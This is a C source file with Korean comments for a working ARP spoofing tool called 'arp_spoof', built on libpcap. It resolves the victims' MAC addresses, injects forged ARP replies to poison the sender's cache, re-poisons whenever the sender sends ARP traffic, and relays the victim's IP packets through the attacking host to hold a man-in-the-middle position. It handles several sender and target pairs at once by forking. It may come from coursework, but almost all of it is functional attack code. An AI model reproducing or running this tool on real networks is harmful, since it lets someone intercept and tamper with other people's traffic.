#include <pcap.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <string.h>
#include <unistd.h>
#include<stdlib.h>

#define INFOLEN 256
#define ARP_PACKET_LEN (sizeof(struct ether_header) + sizeof(struct ether_arp))

char INFO[INFOLEN];

struct in_addr local_ip_addr;
struct ether_addr local_mac_addr,allf, all0;

//로컬 ip 찾기
bool get_local_ip(const char *name) {
	snprintf(INFO, INFOLEN, "ifconfig %s | grep -Eo \'inet (addr:)?([0-9]+.){3}[0-9]+\' | grep -Eo \'([0-9.]+)\' ", name);
	FILE *fp = popen(INFO, "r");
	if (!fp) return false;

	fgets(INFO, INFOLEN, fp);
	INFO[strcspn(INFO, "\r\n")] = '\0';
	fclose(fp);
	return true;
}

//로컬 mac 찾기
bool get_local_mac(const char *name) {
	snprintf(INFO, INFOLEN, "/sys/class/net/%s/address", name);
	FILE *fp = fopen(INFO, "r");
  if (!fp) return false;

	fgets(INFO, INFOLEN, fp);
	INFO[strcspn(INFO, "\r\n")] = '\0';
	fclose(fp);
	return true;
}

//arp 패킷 만들기
void create_eth_arp(uint8_t *packet, struct ether_addr eth_src, struct ether_addr eth_dst, uint16_t arp_option,
	struct ether_addr arp_hw_src, struct ether_addr arp_hw_dst,struct in_addr arp_ip_src, struct in_addr arp_ip_dst) {
  unsigned int IPV4_LEN = 4;

	struct ether_header *eth = (struct ether_header*)packet;
	memcpy(eth->ether_shost, &eth_src, ETHER_ADDR_LEN);
	memcpy(eth->ether_dhost, &eth_dst, ETHER_ADDR_LEN);
	eth->ether_type = htons(ETHERTYPE_ARP);

	struct ether_arp *arp = (struct ether_arp*)(packet + ETHER_HDR_LEN);
	arp->arp_hrd = htons(ARPHRD_ETHER);
	arp->arp_pro = htons(ETHERTYPE_IP);
	arp->arp_hln = ETHER_ADDR_LEN;
	arp->arp_pln = IPV4_LEN;
	arp->arp_op = htons(arp_option);
	memcpy(arp->arp_sha, &arp_hw_src, ETHER_ADDR_LEN);
	memcpy(arp->arp_tha, &arp_hw_dst, ETHER_ADDR_LEN);
	memcpy(arp->arp_spa, &arp_ip_src, IPV4_LEN);
	memcpy(arp->arp_tpa, &arp_ip_dst, IPV4_LEN);
}

//응답이 왔는가
bool sender_replies( const uint8_t *packet, struct in_addr sender_ip, struct ether_addr *sender_mac) {
	const struct ether_header *eth = (const struct ether_header*)packet;
	if (ntohs(eth->ether_type) != ETHERTYPE_ARP) return false;

	const struct ether_arp* arp = (const struct ether_arp*)(packet + ETHER_HDR_LEN);
	if (ntohs(arp->arp_op) != ARPOP_REPLY) return false;

	if (*(uint32_t* )&arp->arp_spa != *(uint32_t* )&sender_ip) return false;

	memcpy(sender_mac,arp->arp_sha, ETHER_ADDR_LEN);
	return true;
}

//문법
void usage() {
	printf("syntax: arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
	printf("sample: arp_spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
  exit(-1);
}

//ip에서 mac 찾아내고 저장하기
void get_mac_from_ip(const char *dev, struct in_addr cur_ip_addr,struct ether_addr &cur_mac_addr){
  char errbuf[PCAP_ERRBUF_SIZE];
  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
  if (handle == NULL) {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    exit(-1);
  }
  uint8_t arp_packet[ARP_PACKET_LEN];
  create_eth_arp(arp_packet,
    local_mac_addr, allf,
	  ARPOP_REQUEST,
		local_mac_addr, all0,
	  local_ip_addr, cur_ip_addr);
 
  
  if(pcap_inject(handle,arp_packet,ARP_PACKET_LEN)==-1){
    fprintf(stderr, "Error : %s\n", pcap_geterr(handle));
    exit(-1);
  }
  //printf("Send ARP request\n");
 
  while (true) {
    struct pcap_pkthdr* header;
    const uint8_t *packet;
    int res = pcap_next_ex(handle, &header, &packet);
    if (res == 0) continue;
    if (res == -1 || res == -2) break;
    if (sender_replies(packet, cur_ip_addr, &cur_mac_addr)) break;
  }
  
  ether_ntoa_r(&cur_mac_addr, INFO);
  printf("MAC: %s\n",INFO);
  pcap_close(handle);
}

//sender의 infection 상태 유지하기
void keep_infection(const char *dev, ether_addr* sender_mac_addr,u_int8_t* arp_packet){
  char errbuf[PCAP_ERRBUF_SIZE];
  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 0, 1, errbuf);
   while (true) {
    struct pcap_pkthdr* header;
    const u_char* packet;
    int res = pcap_next_ex(handle, &header, &packet);
    if (res == 0) continue;
    if (res == -1 || res == -2) break;
    struct ether_header *ETH=(struct ether_header *)packet;
    
    if(memcmp(ETH->ether_shost,sender_mac_addr,ETH_ALEN)==0&&
    ETH->ether_type == htons(ETHERTYPE_ARP)){
      if(pcap_inject(handle,arp_packet,ARP_PACKET_LEN)==-1){
       /* printf("Infection error\n");
        break;*/
        fprintf(stderr, "Error : %s\n", pcap_geterr(handle));
      }
     // printf("Keep Infection!\n");
    }
   }
  pcap_close(handle);
}

//relay
void ip_relay(const char *dev, struct ether_addr* sender_mac_addr,struct ether_addr* target_mac_addr){
  char errbuf[PCAP_ERRBUF_SIZE];
  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 0, 1, errbuf);
   while (true) {
    struct pcap_pkthdr* header;
    const u_char* packet;
    int res = pcap_next_ex(handle, &header, &packet);
    if (res == 0) continue;
    if (res == -1 || res == -2) break;
    struct ether_header *ETH=(struct ether_header *)packet;
    
    if(memcmp(ETH->ether_shost,sender_mac_addr,ETH_ALEN)==0&&
      ntohs(ETH->ether_type)==ETHERTYPE_IP){
      memcpy(ETH->ether_shost,&local_mac_addr,ETH_ALEN);
      memcpy(ETH->ether_dhost,target_mac_addr,ETH_ALEN);
      if(pcap_inject(handle,packet,header->caplen)==-1){
      /*  printf("Relay error\n");
        break;*/
        fprintf(stderr, "Error: %s\n", pcap_geterr(handle));
      }
      printf("Relay IP Packet!\n");
    }
   }
   pcap_close(handle);
}

int main(int argc, char* argv[]) {
  //문법
  if (argc<=2||argc%2) usage();
  
  //디바이스 열고 로컬 ip, 로컬 mac, all0, allf 전처리
  const char *dev = argv[1];
  
  if(get_local_ip(dev)!=1){
    printf("Can't find local IP\n");
    return -1;
  }
  printf("Local IP: %s\n",INFO);

  if(inet_pton(AF_INET, INFO, &local_ip_addr)!=1){
    printf("Local IP error: %s\n",INFO);
    return -1;
  }
  if(get_local_mac(dev)!=1){
    printf("Local MAC error: %s\n",INFO);
    return -1;
  }
  printf("Local MAC: %s\n",INFO);
  ether_aton_r(INFO,&local_mac_addr);

  ether_aton_r("ff:ff:ff:ff:ff:ff", &allf);
  ether_aton_r("00:00:00:00:00:00", &all0);

  //fork 이용해서 한번에 여러개 처리
  const int PAIRNUM=argc/2-1;
  int CURNUM=1;
  while(CURNUM<=PAIRNUM){
    int X=fork();
    if(X==0){
      //sender, target mac주소 알아내기
      const char *sender_ip = argv[2*CURNUM];
      const char *target_ip = argv[2*CURNUM+1];
      struct in_addr sender_ip_addr, target_ip_addr;
	    struct ether_addr sender_mac_addr,target_mac_addr;

      if(inet_pton(AF_INET,sender_ip,&sender_ip_addr)!=1){
       printf("Sender IP error: %s\n",sender_ip);
       return -1;
      }

      if(inet_pton(AF_INET,target_ip,&target_ip_addr)!=1){
        printf("Target IP error: %s\n",target_ip);
        return -1;
      }
      
      get_mac_from_ip(dev,sender_ip_addr,sender_mac_addr);
      get_mac_from_ip(dev,target_ip_addr,target_mac_addr);

      
      //최초 infection 이후 infection 지속/relay
      char errbuf[PCAP_ERRBUF_SIZE];
      pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
      if (handle == NULL) {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;
      }
      uint8_t arp_packet[ARP_PACKET_LEN];
      create_eth_arp(arp_packet,
		  local_mac_addr, sender_mac_addr,
	  	ARPOP_REPLY,
		  local_mac_addr, sender_mac_addr,
		  target_ip_addr, sender_ip_addr);

      if(pcap_inject(handle,arp_packet,ARP_PACKET_LEN)==-1){
        fprintf(stderr, "Error : %s\n", pcap_geterr(handle));
        return -1;
      }

      pcap_close(handle);

      int Y=fork();
      if(Y==0){
          printf("Relaying IP Packet---%d\n",CURNUM);
          ip_relay(dev,&sender_mac_addr,&target_mac_addr);
      }
      else if(Y>0){
          printf("Keeping Infection---%d\n",CURNUM);
          keep_infection(dev,&sender_mac_addr,arp_packet);
      }
      else{
        printf("Fork error\n");
        return -1;
      }
      break;
    }
    else if(X>0)
     CURNUM++;
    else{
      printf("Fork error\n");
      return -1;
    }
  }
  return 0;
}
